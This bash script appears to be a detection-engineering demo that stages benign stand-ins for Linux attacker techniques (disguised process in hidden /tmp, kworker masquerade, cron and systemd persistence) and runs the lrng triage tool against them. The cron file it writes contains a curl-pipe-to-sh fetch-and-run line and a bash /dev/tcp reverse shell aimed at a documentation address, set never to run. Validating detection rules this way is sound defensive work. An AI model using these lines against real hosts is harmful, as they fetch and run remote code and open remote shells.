#!/usr/bin/env bash
#
# linux-detection-demo.sh — a safe, self-cleaning demonstration of what
# Live Response NG (lrng) flags on a compromised Linux host.
#
# It stages BENIGN stand-ins for common Linux attacker TTPs and then runs a
# triage. Nothing here is malicious: every "payload" is /bin/sleep, the only
# network addresses used are the RFC 5737 documentation range (203.0.113.0/24,
# which routes nowhere), the reverse-shell / fetch-and-run lines are inert text in
# a cron file — scheduled for 31 February, a date cron never reaches, so they
# cannot fire even on a host where crond is running — and everything staged is
# removed on exit. This is how a detection engineer validates rules — the point
# is to see the tool catch the artifacts, not to run an attack.
#
# Usage:   sudo ./linux-detection-demo.sh            # root sees the most
#          LRNG=/path/to/lrng ./linux-detection-demo.sh
#
set -euo pipefail

LRNG="${LRNG:-./lrng}"
if ! command -v "$LRNG" >/dev/null 2>&1 && [ ! -x "$LRNG" ]; then
	echo "error: lrng not found (set LRNG=/path/to/lrng, or run from a dir with ./lrng)" >&2
	exit 1
fi

DEMO_DIR="/tmp/.lrng-demo"            # a hidden dir in world-writable /tmp
CRON_FILE="/etc/cron.d/lrng-demo"
UNIT_DIR="${HOME:-/root}/.config/systemd/user"
UNIT_FILE="$UNIT_DIR/lrng-demo.service"
WORK="$(mktemp -d)"
PIDS=()

cleanup() {
	set +e
	for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null; done
	rm -rf "$DEMO_DIR" "$WORK"
	rm -f "$CRON_FILE" "$UNIT_FILE"
	echo "• cleaned up staged artifacts"
}
trap cleanup EXIT

echo "== staging benign trip-wires (all stand-ins; payload = sleep) =="

# 1) A "payload" running from a hidden directory in /tmp, named to blend in.
mkdir -p "$DEMO_DIR"
cp "$(command -v sleep)" "$DEMO_DIR/syslogd"
"$DEMO_DIR/syslogd" 600 & PIDS+=("$!")
echo "  [1] process from $DEMO_DIR/syslogd        -> expect process.unusual_exec_path"

# 2) A process masquerading as a kernel thread: it keeps its real exe (python)
#    but renames its comm to a kworker name via prctl(PR_SET_NAME).
python3 - 600 <<'PY' & PIDS+=("$!")
import ctypes, sys, time
ctypes.CDLL(None, use_errno=True).prctl(15, b"kworker/0:9", 0, 0, 0)  # PR_SET_NAME
time.sleep(int(sys.argv[1]))
PY
echo "  [2] process renamed to 'kworker/0:9'      -> expect process.kthread_masquerade"

# 3) Cron persistence: a /tmp autostart, plus a fetch-and-run cradle and a
#    reverse-shell one-liner aimed at the documentation range. The two network
#    lines are scheduled "0 0 31 2 *" (midnight on 31 February), which never
#    comes, so a running crond that reads the file before cleanup (or finds it
#    left behind by a kill -9) still never executes them. lrng rates the command,
#    not the schedule, so the detections are the same. The @reboot line can only
#    fire at boot, and it points at a copy of sleep.
if [ -w /etc/cron.d ] || [ "$(id -u)" = 0 ]; then
	cat > "$CRON_FILE" <<EOF
# lrng detection demo (benign) — safe to delete.
# The network lines are scheduled for 31 February, so they never run.
@reboot root $DEMO_DIR/syslogd
0 0 31 2 * root curl -fsSL http://203.0.113.10/stage | sh
0 0 31 2 * root bash -c 'bash -i >& /dev/tcp/203.0.113.10/4444 0>&1'
EOF
	echo "  [3] $CRON_FILE                 -> expect persistence + exec.* findings"
else
	echo "  [3] skipped cron (need root to write /etc/cron.d)"
fi

# 4) A systemd user unit whose ExecStart runs the /tmp payload (left disabled).
mkdir -p "$UNIT_DIR"
cat > "$UNIT_FILE" <<EOF
[Unit]
Description=lrng demo (benign) — safe to delete
[Service]
ExecStart=$DEMO_DIR/syslogd 600
[Install]
WantedBy=default.target
EOF
echo "  [4] $UNIT_FILE   -> expect persistence.unusual_path"

sleep 1   # let the staged processes settle into /proc

echo
echo "== running: lrng triage (processes, network, udp, modules, localaccounts, autoruns) + IOC + intel =="
set -x
"$LRNG" -collectors processes,network,udp,modules,localaccounts,autoruns \
	-iocs -intel -no-dns -no-hash -quiet -force -out "$WORK/report.json"
set +x

echo
echo "== what lrng flagged =="
python3 - "$WORK/report.json" <<'PY'
import json, sys
rep = json.load(open(sys.argv[1]))
rank = {"critical": 0, "suspect": 1, "notable": 2, "info": 3}
rows = []
for r in rep["results"]:
    for rec in r["records"]:
        for f in rec.get("findings", []):
            rows.append((rank.get(f["severity"], 9), f["severity"], f["rule"],
                         f.get("technique", "-"), r["collector"], f["detail"]))
rows.sort(key=lambda x: (x[0], x[2]))
s = rep["summary"]["by_severity"]
print(f"  {sum(s.values())} findings  ({', '.join(f'{v} {k}' for k, v in sorted(s.items()))})\n")
for _, sev, rule, tech, coll, detail in rows:
    print(f"  [{sev:<8}] {rule:<28} {tech:<10} ({coll})")
    print(f"             {detail[:150]}")
PY
echo
echo "(Full structured report with IOC + endpoint-intel attribution: $WORK/report.json — removed on exit.)"
